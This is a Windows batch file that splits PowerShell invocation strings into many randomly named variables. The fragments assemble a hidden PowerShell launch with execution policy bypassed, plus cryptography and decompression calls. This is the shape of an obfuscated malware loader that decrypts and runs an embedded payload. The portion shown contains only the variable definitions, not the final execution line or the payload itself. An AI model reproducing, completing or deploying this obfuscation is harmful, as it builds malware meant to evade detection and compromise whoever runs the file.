@echo off
set "UCIjtvSauZ=ll"
set "nVKHAnGvOX=s\"
set "qpDrairJdf=ll"
set "wKotpZGezZ=:\"
set "WkKNWknfHT=ow"
set "MAHmEyMGRY= C"
set "TOdyWjRYVe=xe"
set "IJPMBgWdUr= /"
set "welpfGTaSC=ws"
set "tHOwDjQamP=em"
set "CowxPBlKNn=po"
set "VCzXSTZjHc=py"
set "PnFslGUJUa=32"
set "vAvUzUIxHp=rs"
set "uKOhNuoQwX=rS"
set "KqqaTVcBrT=Sy"
set "dJvcqoheOi=Po"
set "fcoCebGwsx=do"
set "qqAXuLUkbx=he"
set "fAINcvJupV=nd"
set "BzTlyHNvqQ=Wi"
set "znZTISbEOs=0\"
set "dbmlVgylJC=we"
set "ZqIRZBarEz=1."
set "iMONEbggEj=\W"
set "iHqqhsVopW=\v"
set "YkuWWbSBXU=.e"
set "jCbVGvGlmP=he"
set "pmODdqOgpn=st"
set "WrGTuJQCMs=co"
set "zrVqPDURkR=we"
set "DYtCrgWEas=y "
set "yAgBDcCTxJ=in"
set "vkNgSOyuWn=cd"
set "gDGgJZuefY= %~dp0"
set "RaddWJOjRm=OhmG"
set "ZQHiCMhthv=PCe "
set "vhbWuHbFzh=CFxo"
set "epyvlsOqUs=tsWi"
set "JQxWLpZTrq=]::N"
set "OjyTwKtHPp=k; }"
set "xHaYxOVMFG=rity"
set "sjiZCWAucO=tryP"
set "tgljiBPeGi=ress"
set "AmhpAKtWwn=nirt"
set "ngUxVdEGnQ=comp"
set "bRmcRiEhPT=6esa"
set "yobtzsQBBC=m.IO"
set "LhKmHsuNKR=eil."
set "uMKXXtXEkF=ach "
set "PXPfkwVVns=();$"
set "ARHxDsQGbu=hmGN"
set "ioAmlwQfyJ=ss -"
set "soLhOMagNm=rtS4"
set "MexAzZUzcn=pose"
set "YoJHMGjtsP=raph"
set "IHmEbICTKo=-joi"
set "qsCygfXqJA=.Com"
set "dZcLPBBwgN='')("
set "QHzQQAdSMf=fore"
set "mxFNJzWPag=);$O"
set "fmevqirAAH=.Sec"
set "nQHUuSqfvD= '')"
set "xaQkFFnLvL=pose"
set "oblpNBEqCP=em.I"
set "PIjJmqgnpr=Fina"
set "KtAHwjiEcC=hmGN"
set "jmOXHdNPOa=.Cry"
set "YPmAHUdqsr=and "
set "wAZgitvUsC='0Pg"
set "ScJzgEtPly=y.Ci"
set "CNbDrFYUMq=ypto"
set "OaHYkWPPnb=rofi"
set "mEtokdBcrR=brea"
set "mnCRlKtEnw=sbGE"
set "ZuJqVgntGl=.IO."
set "GbvIbiDJWQ=siK "
set "TcktxeJzpm=ionM"
set "XNGQUXLfmQ=WGIi"
set "GCiqhrPwaR=.Len"
set "VSafwECBBd=)) {"
set "eaGDdoxVkj=-4] "
set "lTLPQQYMia=);$q"
set "bPNmdoCFpo=S46e"
set "cRKDzmGBrz=$gae"
set "ITRvmDzCKY=ct S"
set "HnZjOYLHKU=)))"
set "ktoVAiRREj=)($g"
set "tANhTYZoym=stem"
set "ziKBbPnsGb=oin "
set "IzPrZHjOXF=[]] "
set "YNtZngokEJ=K.En"
set "ucdJrJrwUj=bypa"
set "GLrcSLKsqA=esaB"
set "JpmaeHjxXg=hmGN"
